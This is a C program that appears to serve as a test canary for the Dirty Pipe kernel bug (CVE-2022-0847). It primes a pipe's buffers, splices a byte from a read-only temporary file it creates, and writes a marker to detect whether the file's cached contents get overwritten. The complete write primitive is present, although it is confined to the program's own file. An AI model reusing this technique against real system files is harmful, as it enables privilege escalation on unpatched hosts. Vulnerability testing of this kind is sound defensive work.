// SPDX-License-Identifier: AGPL-3.0-only
// Non-privilege-bearing CVE-2022-0847 canary over a caller-owned temporary file.

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

enum {
    page_bytes = 4096,
    file_bytes = 2 * page_bytes,
    marker_bytes = 4,
};

static int gate(void) {
    const char ready[] = "READY\n";
    char start = 0;
    if (write(STDOUT_FILENO, ready, sizeof(ready) - 1) != (ssize_t)(sizeof(ready) - 1)) {
        return -1;
    }
    return read(STDIN_FILENO, &start, 1) == 1 ? 0 : -1;
}

static int write_all(int descriptor, const void *data, size_t bytes) {
    const unsigned char *cursor = data;
    while (bytes != 0) {
        ssize_t written = write(descriptor, cursor, bytes);
        if (written <= 0) {
            return -1;
        }
        cursor += (size_t)written;
        bytes -= (size_t)written;
    }
    return 0;
}

static int prepare_pipe(int descriptors[2]) {
    unsigned char buffer[page_bytes];
    memset(buffer, 'P', sizeof(buffer));
    if (pipe2(descriptors, O_CLOEXEC) != 0) {
        return -1;
    }
    int capacity = fcntl(descriptors[1], F_GETPIPE_SZ);
    if (capacity <= 0) {
        return -1;
    }
    for (int remaining = capacity; remaining > 0;) {
        size_t chunk = remaining < (int)sizeof(buffer) ? (size_t)remaining : sizeof(buffer);
        if (write_all(descriptors[1], buffer, chunk) != 0) {
            return -1;
        }
        remaining -= (int)chunk;
    }
    for (int remaining = capacity; remaining > 0;) {
        size_t chunk = remaining < (int)sizeof(buffer) ? (size_t)remaining : sizeof(buffer);
        ssize_t consumed = read(descriptors[0], buffer, chunk);
        if (consumed <= 0) {
            return -1;
        }
        remaining -= (int)consumed;
    }
    return 0;
}

static int run_once(const char *mode, uint64_t iteration, int *mutated) {
    char path[160];
    int length = snprintf(
        path,
        sizeof(path),
        "/tmp/cpu2tensor-dirty-pipe-%ld-%llu",
        (long)getpid(),
        (unsigned long long)iteration
    );
    if (length <= 0 || (size_t)length >= sizeof(path)) {
        errno = ENAMETOOLONG;
        return -1;
    }
    unsigned char contents[file_bytes];
    memset(contents, 'A', sizeof(contents));
    int writable = open(path, O_CREAT | O_EXCL | O_RDWR | O_CLOEXEC, 0600);
    if (writable < 0 || write_all(writable, contents, sizeof(contents)) != 0 ||
        fsync(writable) != 0 || close(writable) != 0 || chmod(path, 0444) != 0) {
        return -1;
    }
    int readonly = open(path, O_RDONLY | O_CLOEXEC);
    int pipe_descriptors[2] = {-1, -1};
    if (readonly < 0 || prepare_pipe(pipe_descriptors) != 0) {
        return -1;
    }
    off_t offset = page_bytes;
    const char *payload = strcmp(mode, "effect") == 0 ? "BUG!" : "AAAA";
    int status = 0;
    if (splice(readonly, &offset, pipe_descriptors[1], NULL, 1, 0) != 1 ||
        write_all(pipe_descriptors[1], payload, marker_bytes) != 0) {
        status = -1;
    }
    unsigned char observed[marker_bytes];
    if (status == 0 && pread(readonly, observed, sizeof(observed), page_bytes + 1) !=
            (ssize_t)sizeof(observed)) {
        status = -1;
    }
    if (status == 0 && memcmp(observed, "BUG!", marker_bytes) == 0) {
        *mutated = 1;
    }
    close(pipe_descriptors[0]);
    close(pipe_descriptors[1]);
    close(readonly);
    chmod(path, 0600);
    unlink(path);
    return status;
}

static int parse_loops(const char *text, uint64_t *loops) {
    errno = 0;
    char *end = NULL;
    *loops = strtoull(text, &end, 10);
    return errno == 0 && end != text && *end == '\0' && *loops != 0 ? 0 : -1;
}

int main(int argc, char **argv) {
    if (argc != 3 || (strcmp(argv[1], "effect") != 0 && strcmp(argv[1], "neutral") != 0)) {
        fprintf(stderr, "usage: %s effect|neutral LOOPS\n", argv[0]);
        return 2;
    }
    uint64_t loops = 0;
    if (parse_loops(argv[2], &loops) != 0) {
        fprintf(stderr, "loops must be a positive integer\n");
        return 2;
    }
    if (gate() != 0) {
        return 3;
    }
    uint64_t mutations = 0;
    for (uint64_t iteration = 0; iteration < loops; ++iteration) {
        int mutated = 0;
        if (run_once(argv[1], iteration, &mutated) != 0) {
            perror("hardware Dirty Pipe canary");
            return 4;
        }
        mutations += (uint64_t)mutated;
    }
    printf("mode=%s loops=%llu mutations=%llu\n", argv[1],
           (unsigned long long)loops, (unsigned long long)mutations);
    return 0;
}
